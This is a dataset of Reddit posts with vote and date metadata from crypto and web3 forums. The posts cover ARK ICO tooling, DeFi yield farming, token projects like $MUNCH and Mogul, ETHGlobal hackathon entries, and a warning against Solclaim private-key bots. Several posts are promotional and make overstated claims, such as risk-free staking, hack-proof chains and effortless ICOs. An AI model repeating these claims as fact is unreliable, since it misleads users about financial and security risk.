(ARK) ACES Completes Integration of ARK Channels for Two-way Transfers for Easy ICOs When Paired With ARK Deployer (Push-Button-Blockchains),"please see our blog post here: https://medium.com/@arkaces/aces-completes-integration-of-ark-channels-for-two-way-transfers-for-easy-icos-when-paired-with-ark-bdf8229890ad text of the blog included. less then two months ago we commented on how aces could be levered to support ark icos for push-button-blockchains. today, we’ve launched the protocol to support this. we’re calling it arka-arkb channel services. combining this service with the already released ark deployer from the ark team will allow you to connect your independent ark blockchain to the ark main chain (or any other ark network) to exchange between the tokens. for another guide on ark deploy see this guide on using azure for ark deployer. what’s the difference between ark-a and ark-b? these are simply ark network variables, and they can be any ark-based chain. for example, the default in our repository sets arka to the ark mainnet and arkb to the ark devnet. simply adding your independent blockchain’s network config to the network config directory and then replacing the arkbnetworkconfigpath with the correct network config location will replace arkb with your new network, and your new token will be connected and for sale when you boot the aces application. why is this awesome? starting an ico or any other tokenized project and monetizing it through any connected blockchains is super easy now. we are approaching an era where launching an independent blockchain with connections to other blockchain services (like transfer and contract) can be done from start to finish in less than an hour. we’ve already have several interested parties in working with aces to support their project in some way. you can have your project tokens for sale in less than a few hours of work, as a complete beginner. with a robust aces marketplace, you could be connected to all sorts of coins and receive funding in any coin that has available capacity only by connecting your service to ark through this newly released service. this is because aces channel services can be linked together. a diagram of the flow of a linked-channel-service is shown below. just replace eth with arkb, and you can see how an ark ico can accept bitcoin to sell their new tokens. the ark ico concept can succeed without any other aces service providers, because the project hosts become an aces service provider with large capacity of their network available for transfer. this means even if there isn’t enough capacity on the aces platform for external coins like bitcoin, ark can be very successful for launching icos and independent blockchains. brand new chains that do not have, and may never have, listing on exchanges will be available through ark using the chains available and liquid aces service. this makes ark competitive with easy ico options like ethereums erc20 tokens, but the ark-based tokens would reside on their own independent blockchain and not produce any bloat for non-users. as a user/investor, you will not need to ever worry about registering erc20 tokens for eventual transfer to a mainnet, as this can be easily facilitated with custom aces services and ark push-button-blockchains, which as mentioned already, can be set up by projects before their first coffee break of the day. next steps we will now return to enhancing the aces marketplace, with security audits, adding searchable services, easy deployments, and more. the next month will focus primarily on security audits and ui improvements for what we already have released, and then afterwards we will focus on admin tools for easy deployments and service monitoring. join the team! we’re on the look out for more contributors. we welcome any one to contribute to the project. here are some contributions we’d love to receive some focus: more coin services. linking external blockchains to ark and using our existing repos as guides. our top desired connection is monero to ark. if you want to take this one, reach out! you will need to know java and spring-boot to work closely with our existing repos, but this is not a requirement if you want to implement in other ways. marketplace feature build out. we use angular for the front-end. if you are interested in learning more about angular or contributing to an angular project, we’d love help in this area! you do not need to be expert, and all code will be reviewed by the team. tutorials and guides. do you not have much technology experience and just want to learn how to use and teach how to launch aces services and chains? we’d love for some people to put together tutorial blogs, videos, etc, that show how to launch an ark-based chain alongside an aces service. service providers. it would be great to have some people hosting aces services with some non-zero mainnet capacity. this is a legitimate business opportunity, and you would be able to be a profitable business by using the integrated aces service fees.",54,5,0.92,2018-04-18 10:30:32,web3,CryptoTechnology,ryano-ark,False,43.6

Imusify - The solutions offered by using the potential of blockchain usage,"imusify presents several features and functions that help users realize their intentions from direct consumer-to-creator transactions, crowdfunding artist campaigns and content licensing protocols. in addition to the imusify feature it provides to its community, the open-source platform allows users to build new use cases that provide value and build connections using an imusify intelligent contract system. from this perspective, we can begin to see how intelligent contracts define the characteristics that classify blockchain as a fluid technology character in a story. now let's look at how the global music industry is as it is today and examine key inefficiencies imusify will deal with a smart music ecosystem based contract. the centralized nature of industry creates three main challenges for artists: digital rights management, transparency of payments and licensing and monetization. these main problem areas are discussed in detail below: **1. human rights management** the lack of a comprehensive rights management regime created several problems for managing the digital rights of artists from lost income to wrongful ownership. as now every right holder receives their share by registering with a community that has the duty to collect and share collected funds called royalties among all holders of rights based on agreements, partially determined by right holders but also often determined by the collecting community. even if artists can now produce, distribute and market their work almost entirely digitally they still have little control over ownership and security of rights. **2. payment transparency** payment transparency issues arise from centralizing the distribution of royalty systems. performance rights organizations carry out the process by collecting payment royalties from streaming services and then allocating payments to artists based on royalty rates set by the organization such as the copyright royalty board. there are also other transactional processes where holders the right to try to collect payments. **3. licenses and monetization** outdated legislation around licensing systems and tariff setting failed to use technology to track licenses and send royalties. digital music services have no efficient system in place to get and track all licenses related to various types of digital consumption such as radio, streaming on demand, streaming radio, digital purchases and more. smaller artists don't have the resources to impose control over their content and rights. with limited information about how payments related to their content really don't work, they are often left out or not considered at all. the solutions offered by imusify by using the potential of blockchain usage, imusify uses blockchain to overcome industry challenges and provide real-world use cases that will not only bring value directly to the music room, but also educate early users to lead the evolution towards community adoption of blockchain use cases others.and can solve all the problems of transparency, data accuracy and financial problems. you can visit their site for more information about the ico: [https://imusify.com/](https://imusify.com/)",55,0,1.0,2018-10-07 06:45:49,web3,BlockchainStartups,DBlackMoon,False,43.0

The Importance of Blockchain Flexibility: Allowing Developers to Code Smart Contracts in Any Programming Language,"lately, i've been contemplating about my future within blockchain and one key thing that has come up repeatedly is how we program smart contracts. most blockchains currently require developers to write smart contracts in deliberately domain-specific languages such as solidity (ethereum) or vyper. even though these languages are robust in their own aspects, they still have learning curves and constraints. how fabulous would it be, if any development platform of blockchain enabled smart contract developers to develop the codes in their comfortable programming language? here are some reasons why i think this flexibility is important for the evolution of blockchain and crypto more generally: accessibility: by enabling smart contract development in additional languages there is a lower barrier for more developers with varied backgrounds to work on the blockchain. this might help speed up growth and innovation in this sector. security & reliability: security and reliability can vary from one language to another. by letting developers use the languages in which they excel, greater contract stability and security may be obtained. ecosystem growth: by supporting multiple languages, blockchain platforms could attract developers who might otherwise be deterred by the need to learn a new language just for smart contract development. this could lead to a larger and more diverse developer community. interoperability: imagine smart contracts that can easily interact with existing systems and databases because they are written in languages commonly used outside of blockchain development. this could significantly enhance blockchain's potential for real-world applications. innovation: different programming languages encourage different ways of thinking and problem-solving. allowing smart contracts to be written in a variety of languages could foster innovation by bringing fresh perspectives to blockchain development. of course, there are challenges such as ensuring compatibility and maintaining security standards across different languages. qanplatform a layer 1 hybrid quantum resistant blockchain has this features through it qvm allowing devs code smart contracts in any programming language of there choice. do you know any other blockchain that prioritizes this as well? imo, i think it will be a good investment since there are not too many blockchains that offer this yet.",39,22,1.0,2024-07-02 06:37:42,web3,BlockchainStartups,Chihabrc,False,42.2

How to make the most of your stablecoins ,"the best course of action when you don't know what to do is to do nothing. right? most of you will say a big fat “yes.” but, how can you still earn a profit while sitting on a bunch of stablecoins, waiting for clarity? i might have got the answer for you, sers. it's simple- defi yield farming. now, before you go ahead and leave this post because defi is not the next big thing in crypto, wait just a bit. let me explain. what if you take those stablecoins (let's say usdt/usdc) that are doing exactly nothing, and deploy them in a liquidity pool on a dex? now, this might have a bit more risk than simply holding, but that risk is greatly reduced if you use a reputable and trusted dex. now you've got a recipe for a consistent, beautiful yield. for example, my go-to blockchain is polygon (cheap gas, high tvl, lots of stable coins, etc). while not the most popular one out there currently (mostly price-related drama), the tech is still there. when it comes to the dex, that’s easy! i use quickswap, which is the leading dex on polygon. been using it since forever and never had any issue, plus they have been a dex for quite some time with no exploit/compromise. you could go for others such as uniswap and alike, we're just talking about personal taste here. one reason i choose quickswap is that it’s the only dex that incentivizes stable pools, which leads to a higher yield. here are some aprs you could get on quickswap right now: * usdc/axlusdc: 14.3% * dai/usdt: 12.5% * usdc/usdt: 9.7% while there's a bit more risk involved, an almost 10% apr on a usdc/usdt pair is nothing to sniff at, and doesn’t rely on gimmicks that eventually go bust like we’ve seen with ust/blockfi/genesis etc now, what are your favorite ways of sitting on your hands? do you just hold? do you stake? do you lp? i’d love to learn how others are making the most out of their idle coins.",17,57,0.9,2024-10-21 17:37:17,web3,defi,Automatic-Train-9153,False,42.0

Who decides the chain truth after a severe downtime?,"dear all, this is a scenario that i tried to think through - let us use it for a healthy discussion regarding points i) - iii) below. we know from bitcoin's case that after a severe downtime of the network the longest chain is set as the objective truth due to the energy put into creating blocks. this is a great detail of bitcoin's network which makes it a great option for a hard monetary base layer for the world. security and decentralization are the only two options that are acceptable for just that, a hard monetary base layer. however with ethereum's proof of stake ecosystem, things are different. from my understanding the largest validators that produce blocks set the truth for the history and current state of the blockchain. i) is this true? let us think such a scenario through. ethereum, for whatever reason, experiences a severe downtime for a few days. when the ecosystem wants to re-adjust itself, there is a large group of validators that conspire and collude against the network. the history is changed and transactions censored. as for bitcoin, the nodes also validate the chain (the term 'validator' is a bit unfortunate as nodes validate as well, but 'validators' also produce blocks). ii) most of the many thousands of global nodes would notice inconsistencies due to the collusion of the bad validators, correct? if so, then the most probable next step would be a soft fork. in this case, the bad validators would also have their large staked amounts in the new and correct blockchain. iii) as those validators would still hold a majority stake then, the whole process can be repeated again. would they get slashed after the soft fork and if so, how is this determined? do they lose all their stake? any details on this are highly appreciated! thanks a lot!",37,28,0.8,2023-12-09 16:59:15,web3,ethereum,UpperOrdinary,False,41.4

How New Protocols Are Tackling Liquidity Issues,"liquidity is a cornerstone of financial systems, which also holds true for crypto markets. in simple terms, liquidity means that assets can be bought or sold quickly without causing significant price changes, ensuring smooth transactions with minimal slippage. however, in the decentralized finance (defi) space, liquidity comes with challenges. liquidity can be fragmented, and spread across various platforms and chains, making it difficult to access when needed. low liquidity can lead to slippage, where price shifts occur, resulting in less favourable execution prices. there's also the issue of capital efficiency—traditional models often lock up capital, limiting its use for other purposes like staking or securing the network. and then there's the challenge of balancing liquidity with network security, a task that conventional methods struggle to manage effectively. supra labs has developed an innovative solution to address these challenges through its proof of efficient liquidity (poel) protocol. poel is designed to unify liquidity across hundreds of chains, streamlining trading, staking, and other crypto activities. this approach not only enhances the efficiency of transactions but also improves the overall experience for users in the defi space. supra labs utilizes poel to enable defi liquidity pools to borrow and stake $supra, its native token. this mechanism keeps funds active while simultaneously strengthening and diversifying supra’s layer-1 network. by allowing the same capital to be applied to both liquidity and network security, poel significantly enhances the system's resilience and efficiency. it ensures that liquidity providers play a crucial role in boosting network stability and security. the need for a more efficient liquidity mechanism is paramount. as we explore innovative solutions, protocols like poel could emerge as the game-changers we've been waiting for, leading the charge toward a more resilient and seamless financial ecosystem.",49,4,1.0,2024-08-19 06:56:51,web3,defi,Ok-Western-5799,False,41.0

"Revolutionizing Web3 with cutting-edge security and performance.
","as web3 continues to evolve, security and performance are becoming central to the success of decentralized applications (dapps) and blockchain networks. supra\_labs is making notable strides in this area, emphasizing both robust security measures and high-performance systems to handle growing data and transaction demands. their approach is about building a strong foundation for trust and scalability in the web3 ecosystem. chainlink is another key player in this space, renowned for its decentralized oracle network that enhances security and performance across blockchains. by providing reliable and tamper-proof data feeds through a network of independent nodes, chainlink addresses the risks associated with single points of failure and ensures the accuracy and speed of data delivered to smart contracts. this makes it a critical component for many defi and web3 applications. polkadot also contributes to this critical focus by enhancing scalability and interoperability with its parachain architecture. this design allows multiple blockchains to operate in parallel, significantly increasing the network's performance and capacity while facilitating seamless cross-chain communication. the collective efforts of supra\_labs, chainlink, and polkadot highlight how essential security and performance are for the future of web3. as these technologies advance, they set a high standard for the industry, driving innovation and ensuring the reliability of decentralized systems. do you think the recent development of these projects will take web3 to the next level? feel free to share your thoughts in the comment section",43,13,0.99,2024-09-20 05:44:20,web3,BlockchainStartups,izdigohkz,False,40.9

Exploring Gas-Free Transfers in Crypto Wallets: A Look at Coinbase Wallet and Guild Wallet,"the advent of blockchain technology has brought about revolutionary changes in the way we transact and exchange value. however, one aspect of blockchain transactions that has been a pain point for users is the concept of 'gas fees'. in simple terms, these are fees paid to miners to validate transactions on the ethereum blockchain. gas fees are based on the computational work required to process transactions and smart contracts on ethereum, with more complex contracts and code requiring more gas to execute​​. with the rise of ethereum's popularity, these gas fees have become a significant concern for many users. the introduction of eip-1559 helped manage these gas fees, allowing users to pay a base fee and a priority fee based on how quickly they want their transaction to go through​​. but the question remains, how can we make these transactions more cost-effective for users? in recent years, some platforms have developed solutions to mitigate or even eliminate gas fees for certain operations. coinbase wallet, for instance, now offers gas-free transactions for usd coin (usdc) on the polygon (matic) chain. this feat became possible thanks to eip 4337, or ""account abstraction"" in evm-compatible blockchains, which allows developers to subsidize gas fees for transfers from given accounts​2. guild wallet is another platform that has explored gas-free transactions. guild wallet provides 'gas free coupons' that cover transaction gas fees up to 1 usd for usdt, usdc, or busd on the bnb smart chain. this initiative seems to be a part of an event to celebrate the launch of their new wallet service​​. while these developments are promising, more technical information about how guild wallet manages these gas-free transactions could lead to a deeper understanding of this feature. perhaps some of you in the community have come across more details or have insights into how this is technically implemented? the move towards gas-free transactions is a significant step forward in improving the user experience and making blockchain transactions more accessible. as we continue to explore and understand these mechanisms, it will be interesting to see how this trend evolves in the future. looking forward to hearing your thoughts and insights on this topic.",27,35,1.0,2023-06-16 03:13:37,web3,CryptoTechnology,vwv_vwv_vwv,False,40.2

[**ocean protocol**](https://oceanprotocol.com/) and [**athena protocol**](https://www.athena.tech/) are 2 blockchain projects joining hands to provide a solution to this problem by providing data validation and verification services. data validation is needed to determine whether a particular piece of information falls within the acceptable range of values for a given field. this makes for a very much more accurate form of data. data verification, on the other hand, is done to perform checks on the current data to ensure that it is accurate, consistent, and reflects its intended purpose. verification plays an especially critical role when data is migrated or merged from outside data sources. this has been one major source of concern for data proponents, verifying the authenticity of data and data sources even in the ocean data marketplace. earlier in the year, ocean protocol announced **$2 million** in funding for shipyard projects in 2022. in their [announcement article.](https://oceanprotocol.com/press/2022-02-17-ocean-protocol-shipyard-launch) 🤑 sheridan johns, enterprise lead at ocean protocol, stated: >***“ocean protocol foundation is proud to support innovative projects at the forefront of building the open data economy and ocean shipyard is designed to help these projects succeed. i am excited about the opportunity to work together with such highly skilled and motivated teams.”*** athena protocol is the first grantee of 2022 to benefit from that $2 million fund. athena protocol will add value to the ocean ecosystem by developing an interface to accredit data before it is posted to the marketplace as well as bringing easy-to-consume climate datasets collected from iot mesh networks and satellites. this will make data provided on the ocean data marketplace even more accurate than ever. and concerning [shipyard](https://oceanprotocol.com/press/2022-02-17-ocean-protocol-shipyard-launch), i think it's an opportunity for passionate individuals or teams looking to build something valuable on ocean protocol to get funding. a lot of ecosystems provide builders with grants and funding to develop ideas, solana, polygon, dfinity, secret network, and near protocol are some of the popular ecosystems with recent funding. you can submit your idea[ here](https://oceanprotocol.com/shipyard). best of luck with that😊 # buidlers build in bear markets!!!",17,50,0.95,2022-07-18 14:49:16,web3,web3,nzubemush,False,39.7

Here's how blockchain technology is transforming the real estate industry,"from purchasing a new house to selling real estate, blockchain technology can streamline time consuming processing while reducing costs and errors. the real estate investing game as we know it is on the brink of undergoing some significant and sizable changes. most notably, blockchain technology is revolutionizing how the industry works from the inside out. here are some of the ways that blockchain is impacting real estate investments: \- tokenization: blockchain is able to tokenize the ownership of assets – real estate or otherwise – which ultimately democratizes ownership and makes it to where anyone with any amount of money can get some skin in the game. \- smart contracts: smart contracts are automated contracts that self-execute with very specific instructions that are written in code and stored in the blockchain. they’re written in a “solidity” programming language, which uses “if-this-then-that” language. this has the ability to automate rent payments and all other financial aspects of real estate relationships. \- more rewards and opportunities: blockchain has the potential to remove so many of the barriers to entry that keeps middle-class individuals out of the investing game. for example, landshare is a project in this space that provides a hassle-free alternative to traditional real estate investments. they also allow you to earn yields on your real estate by staking stablecoins without any risks or commitments. \- lower costs: when intermediaries are cut out and contractual processes are streamlined, this results in lower costs for both buyers and sellers of investment real estate. some or all of the following may be eliminated or reduced in the very near future: loan fees, inspection costs, registration fees, transfer fees, taxes, commissions, and underwriting costs. \- new classes of investments: with tokenization, fractional ownership, and smart contracts, it’s possible that entirely new classes of real estate investments will emerge. from homeowners selling garage space to mobile home park investors helping tenants become property owners, there’s potential for a serious shakeup in this sleepy space. what are some more interesting use cases of blockchain technology that are being used in the real estate industry?",39,14,0.97,2021-08-25 04:09:11,web3,BlockchainStartups,davetawin,False,38.7

Can blockchain technology be used to empower small businesses with efficient and secure supply chain management solutions?,"in the past and even today, small businesses face a number of challenges when it comes to supply chain management, some of which include limited access to resources and technology, lack of transparency and high costs. however, can the advent of blockchain-based supply chain platforms help tackle these issues? i was curious about this and did a little bit research myself on how small businesses can leverage cutting-edge technology to streamline their operations, enhance transparency and efficiency. we have platforms like vechain, morpheus network and provenance, who are leading the way in providing their blockchain technology and solutions for supply chain management. the offer features like real-time tracking, digital verification, smart contracts in order to improve efficiency and security. all of this can help small businesses to build trust with their customers and they can provide proof of product authenticity, sustainability and quality. furthermore, they can also help these small businesses reduce costs by eliminating intermediaries, automating their processes and reducing the risk of fraud and error. i think this can help small businesses gain a competitive edge in the market and improve their profitability too! as the technology continues to mature and adoption increases, i'm sure we'll see more and more small businesses leveraging the benefits of blockchain for their success. i would love to know more about this and also your insights or thoughts on this?",28,31,0.89,2023-03-09 02:54:33,web3,CryptoTechnology,plxmtreee,False,38.1

Blockchain Adoption in Traditional Systems: What's Next?,"the traditional system is beginning to warm up to blockchain technology. while i am still unsure how it all works, i can see that others are already migrating and integrating utilities to their advantage. i can't deny that blockchains solve most of the problems, both in the crypto space and the real world. the most significant has been in the area of security. exploits have increased on both on decentralised and centralised systems. the good news is that blockchains have been developing and devising solutions to deal with it. geeq's 99% bft is a perfect example. it leaves no room for hacks. the chain itself is layer 0. comparing the existing l0s like cosmos, polkadot, and avax, i see almost the same thing: interoperability, scalability, fast transactions, etc. these are needed, no doubt, but are they enough? the blockchain space has evolved past the basics. what about data, its simplification, and the inclusion of traditional systems? this is where geeq comes in. their data solution makes provisions for edis. these enterprises can either build a new database in the ecosystem or connect to an existing one, which the chain then modifies and improves. this gives them more freedom from centralisation while also providing more security. the importance of data integrity and flexibility cannot be overemphasized. combine that with the ability to create different chains, build dapps, and run nodes, and i have everything i need. there's only one way to stay ahead, and that's by paying attention to better infrastructure and making use of it for better results. what are your thoughts?",31,24,0.98,2023-01-17 01:11:31,web3,BlockchainStartups,Wayazihj,False,38.0

🍩Why Did I Invest in $MUNCH - The #1 Charity Cross Chain Crypto-Project IMO,"$munch is a charity based crypto-project that essentially takes a portion of every transaction and redistributes it evenly between its holders and the chosen charity. i’m sure you’ve heard of these kinds of projects before, but let me tell you why $munch stands out among the rest. the main advantage of $munch has to be that it is trustless. this means that the team does not control any sort of “charity wallet”. they instead send funds directly to the chosen charities public wallet address during the transaction. this happens automatically and without any sort of team intervention. by doing this, you can rest assured that nobody besides the charity will have access to those raised funds. this makes $munch an actual charity project because it was built from the ground up with this in mind. currently the $munch tokenomics takes 5% of each transaction and sends it directly to the chosen charities wallet address, and another 5% gets redistributed amongst the holders. i know what you're thinking, “if i wanted to donate to charity, i would just do that directly myself. why would i go through $munch?” i thought a lot about this too in the beginning. i’ll be honest when i say that besides the odd $1-$2 outside of grocery stores - i did not donate to charity much at all. i then started to do some math in my head and realized just by buying/selling $munch i’ve already raised hundreds of dollars for charity on my own. something i would never do normally. the best part was, it didn’t even feel like i had. $munch is actually developing a holders dashboard to show statistics such as how much you’ve donated, how much you’ve gained from redistribution, your ranking, etc. the game changer for me is the future plans of being able to take a percentage of those redistribution gains, and allocating them to charity. this will further compound when farming/staking is introduced and you will be able to allocate a % of those rewards as well. in this way, you can help donate directly not only through buys and sells - but simply just by holding. at this year's end i can see myself raising over $1,000 to charity on my own just by holding and staking. simply incredible, and a huge chance for people who actually want to impact the world in a positive way to do so. there is a lot more nuance to $munch that you can find out about through the website [http://munchproject.io](http://munchproject.io/) or the subreddit [https://www.reddit.com/r/munchtoken/](https://www.reddit.com/r/munchtoken/) thanks for taking the time to read, and always do your due diligence.",45,3,0.95,2021-06-26 22:55:19,web3,BlockchainStartups,Locifercrypto,False,37.7

"Mogul Productions, The decentralized film financing (DeFiFi) project is grabbing lot of attention!!","mogul productions, the decentralized film financing (defifi) platform that gives everyone a voice in the creative process, launches its platform. starting today, users can create an account to have the chance to be whitelisted for future access to stars tokens and check-out the films in the showcase that will be voted on with stars when the platform is released on mainnet. gagan grewal, ceo of mogul productions, expressed, ""with all the major streaming platforms experiencing global viewership spikes in 2020 and predictions of the current $50.11 billion market growing 21.0% each year, it's clear that there is a nearly insatiable demand for great content, and yet, it's incredibly difficult for independent creators to get their stories financed and made into films. the exploding demand vs. insufficient supply is one of the most unbalanced markets across industries. at mogul, we are giving filmmakers, fans, and film financiers a voice in the creative process, ensuring that more great films get made, and helping to right this asymmetrical market."" in the current entertainment ecosystem, indie filmmakers have a hard time getting their ideas financed, fans have no say in the process, and financiers have very little transparency into what is happening with their investment. mogul productions will deploy blockchain technology to address these myriad issues, creating an entertainment ecosystem that works for everyone. in the mogul platform, creators gain opportunities for collaboration and the chance to get their films financed by the mogul community. if their project is greenlit, creators also receive production oversight from the experienced mogul team and a built-in fanbase to support the film's success upon distribution. movie fans will be able to engage with the filmmakers and their favorite projects in deeper, more meaningful ways: from voting for which films will receive funding, to earning stars that are redeemable for prizes like one-of-a-kind film posters, red carpet tickets, and invitations to exclusive events. mogul also plans to release a digital asset that will enable compliant participation in profit sharing from mogul-produced movies. financiers will also benefit from greater transparency into how film funds are being deployed during production as well as how profits are being distributed after release. mogul's team of experienced producers provide oversight to ensure productions stay in-budget and on-schedule. upon mainnet launch, users will be eligible to receive stars, the platform's in-app currency used to vote on which films receive funding. mogul harnesses the power of the crowd in its decentralized quadratic voting system, which ensures users with more tokens do not have undue influence over the process. all votes are counted using a formula that makes each vote cast by the same user exponentially more expensive, preventing vote buying and restricting wealth dominance. mogul's non-custodial smart wallet, which will be live upon mainnet launch, is designed to make it easy for anyone, regardless of crypto knowledge, to hold and use stars. the automated password reset flow gives users the ability to reset their passwords in a way that is familiar based on other web experiences without ever giving mogul access to their private keys. the mogul continuous organization is another unique invention of the mogul team. by deploying mogul continuous organization technology, it automatically delegates cash flow management to a community governed organization to ensure constant liquidity for financiers. intially 1.1 million starts will be allocated to farmers per day. mogul is focusing on a very unique usecase and is definitely one to watchout for imo twitter:- https://twitter.com/we_are_mogul telegram:- https://t.me/mogulproductions reddit:- https://www.reddit.com/r/mogulproductions website:- https://www.mogulproductions.com/",44,3,1.0,2021-04-26 02:46:00,web3,BlockchainStartups,Cryptology3366,False,37.599999999999994

Best simple token solution?,"i'm building a project. i need a crypto token for my project. at this point i don't need a full-on blockchain, i just need a way to distribute a token. i thought about using ravencoin because i can distribute the token to thousands of individual addresses extremely cheaply and easily. however, as i thought more about it i realized those that have this token wouldn't be able to easily transfer it into anything else. there's no marketplace or exchange for ravencoin tokens. so they'd kind of be stuck in that ecosystem realistically. i don't want that. so then i thought well i'll just have to use ethereum it'll cost more to distribute the tokens, and it comes with the added work of making smart contracts, but at least they could hold their token in metamask and more easily trade it. then i learned about some other systems. i'm looking at avalanche. what do you think i should use? i want to be able to distribute tokens on a daily basis, i wanted to be simple and easy, and i wanted to be in a wide ecosystem. what smart contract structure should i use on avalanche? edit: a lot of great suggestions here! just in case anyone is curious, after looking into it a little bit more i think we are going to stick to the original plan. all we need is to keep track of points people accrue, but it'd be nice for everyone to be able to audit those points, but we don't want to pay high gas fees. so we'll just use ravencoin for now, and when we make our own chain or series of smart contracts we'll then, at that time stand up a conversion service that will take the ravencoin asset back and distribute the functional token. it's probably the best part for our very simple and early use case, i'm a big fan of essentialism and not doing anything more than you need to to accomplish the goal.",27,30,0.91,2023-12-20 21:17:22,web3,CryptoTechnology,Stack3,False,37.3

Highlights from ETHGlobal Istanbul,"ethglobal istanbul is done and dusted after this weekend and with it, the last hackathon of the year turned out to be the biggest event. it shattered all previous records with 2004 attendees including 1350 hackers from 90 countries, 48 workshops and 427 projects, highlighting immense diversity and new highs of the dev community interest. among the submissions, there were impressive and creative dapp usecases on show which generated attention. dub3_ai was my personal favorite. it’s a new way of incorporating ai onto the blockchain by delivering text-to-speech content which can be transformed into an nft, all wrapped up into an innovative marketplace concept. the aim is to seamlessly allow users to upload and monetize their voice samples. it utilized the cartesi execution environment for llm (large language model) inference, made possible by the cartesi vm, who can run these libraries out of the box, leveraging their risc v based architecture booting an entire linux os. once synthesized, the resulting voice is securely uploaded to ipfs. at the same time, an nft is minted which represents a unique digital asset. its personally no surpise that it won several bounties. check the live demo if this caught your interest: https://ethglobal.com/showcase/dub3-ai-h1riu the 10 ethglobal istanbul finalists definitely didn't disappoint as well and for anyone curious to see the demos, the recording is up of ethglobal youtube channel. but here's a rundown: clade club - a fair and social governance platform which prioritizes data-driven decision-making. (winner of the innovation pool prize) s.c.i - secure contract interactions is an on-chain contract-to-domain verification protocol used to verify smart contracts you are interacting with, validated by the domain owner and prevents scams or phisphing attacks. (nouns dao’s 2nd place winner) bridgebuddy - chain abstracted wallet, utilizing hyperlane warp routes and safe core, to automate bridging of assets when needed. (hyperlane's 2nd best interchain app and others) buddy-guard - a social & security app for people who leave a group at midnight. they can add their social group as buddy-guards, and then the the buddy guard can help watch their track and provide support when necessary. (winner of pool prize on arbitrum and others) sarma - simple primitive to achieve private execution on evm, even cross-chain. (winner of filecoin pool prize and others) aiddistribute - a mechanism to ensure traceable and accountable channel for direct stablecoin transfers. (winner of pool prize on arbitrum and others) taptrust - it redefines event experiences with nfc & ethereum's aa, offering a unique, gasless way to engage. each tap with your nfc chip signs transactions & maintains privacy with a fresh address. (3rd place winner on arx and others) footy stars - onchain fantasy football with real world stakes and provable simulation. (best on scroll, pool prize winner on arbitrum and others) zkvote_cc - using cartesi to verify the votes zk proofs in a deterministic way, it integrates voting tokens with standard erc-20 via bridge, processes voting off-chain, and employs zk proofs for secure l2 state transfer. (shared pool prize on cartesi amongst others) lens & frens - allows you create zero-knowledge proofs to attend events without compromising privacy (2nd place winner on chiliz amongst others). do you usually follow the hackathons of ethglobal? is there anything that caught your attention the most? have you guys participated in any so far? i’d love to hear everyone's thoughts. they also announced the schedule for the next hackathons of 2024, so hopefully, meeting everyone at one of these locations next year, probably in europe! till then, don’t trust, verify, and keep on buidling! edits: typos",36,16,0.9,2023-11-21 10:18:45,web3,ethereum,Blocks_and_Chains,False,37.0

Educational Post - Wallet security - Solclaim scam possibilities. - MUST READ FOR ALL,"hey everyone, i want to make an **important post** regarding the recent hype around services like *""solclaim""* and similar offerings. today, i received a message from a random user on telegram. they sent me a referral link to a telegram bot claiming that you could enter your private keys and get **""free"" solana**. *here’s how to think about this:* >***imagine giving your house key to someone who can unlock every door in your home. you have no way of locking them out and wouldn’t even know if they were inside your house. now, imagine the whole neighborhood giving this same person access, just because some received a few dollars in return. would you really hand over your keys? sounds crazy, right?*** let me break down what’s happening here, as many investors **trust too easily** in this space. **first of all, the solana you are claiming was yours all along.** every nft or token you’ve traded incurs a small rent fee in sol. you can reclaim this rent, which is typically around 20-40 cents per token. *reclaiming this rent is easy and convenient*, especially since we don’t hold onto every token we’ve ever traded. **the problem arises when people trust telegram bots or shady websites with their private keys.** as someone with experience in developing telegram bots, i can tell you that these bots are **99.99% likely** to log your private keys in a database. you might be thinking, *“who would actually trust this? who would hand over their private key just to get some free sol?”* the answer is: **more than 10,000 people**. aggressive marketing tactics are everywhere. while i won’t outright say they’re stealing private keys and draining wallets, even if they do this to just one large wallet a week, it’s a **huge problem**—and trust me, it’s *incredibly easy* for them to do. **once your private key is compromised, it doesn’t matter how long it’s been.** you might forget that you handed it over months ago. then, after making some big trades and seeing success, you wake up one day to find your funds are gone. **and here’s the kicker: you can’t prove it was these services.** they have plenty of ways to deflect blame: * claim a hacker accessed your phone or pc. * suggest you connected your wallet to a malicious site in the past. * insist you made the transaction yourself, because on the blockchain, it will look that way. * assert that they would never steal your private keys and show off certifications (*it only takes three lines of code to log everything sent to a telegram bot*). * accuse you of being a hater trying to tarnish their reputation. **tl;dr:** *never, ever share your private keys with anyone.* if you send them out, even once, it’s risky to trust anyone with such sensitive information, especially if you still use those wallets. while these services may not be mass-scamming (*which would be too obvious*), even targeting just a few large wallets is enough to cause significant harm. there are safe options for reclaiming your sol rent—**always use wallet connections for this**. stay vigilant and protect your assets. please, be careful, and **never share your private keys. ever.** *have a great rest of your day!*",12,52,0.84,2024-11-03 10:14:49,web3,solana,RELaX--,False,36.4

Is Web 3.0 overhyped or the wave of the future?,"web3 is more about bringing physical assets into the digital age and allowing true digital ownership. people who say big tech won't allow it may be correct, but what about a new start-up that uses crypto to allow people to truly own the content they create? how can big tech compete if it doesn't adopt it? is there a market for it? i'm not sure, but crypto enthusiasts seem to think so. it remains to be seen whether it is useful to the general public. it's always been a truism in silicon valley that if you want to know where the next big ideas will come from, look where the money and smart developers are going. there has been no shortage of funds in the case of web3. only a few developers, on the other hand, have decided to jump on this bandwagon. tea, a web 3 tool, was created by a number of well-known developers, including the creators of the homebrew tool. code-enforced contracts are possible with smart contracts. digital assets can be owned using blockchain technology. in the world of finance, this is a game changer. gaming assets are one example i'll use that people might be able to understand. you can work hard for items in a wow game, putting in a lot of time and effort, but if blizzard decides to ban your account for some arbitrary reason, you'll be out of luck. you don't have any rights to them. the blockchain enables you to truly own these items. blizzard will not be able to take them away from you. on the blockchain, there are even assets that can be used in a variety of games. they don't care what game they're playing. before you say it won't catch on, keep in mind that it already has. these games are simple and entertaining, but it is an exciting space that is constantly evolving. tl;dr: blockchain isn't attempting to take the place of mysql. it aims to eliminate counter-party risk by allowing digital ownership of all digital assets. take that in any way you want.",33,19,0.89,2022-04-18 16:37:33,web3,web3,crandalljft,False,36.300000000000004

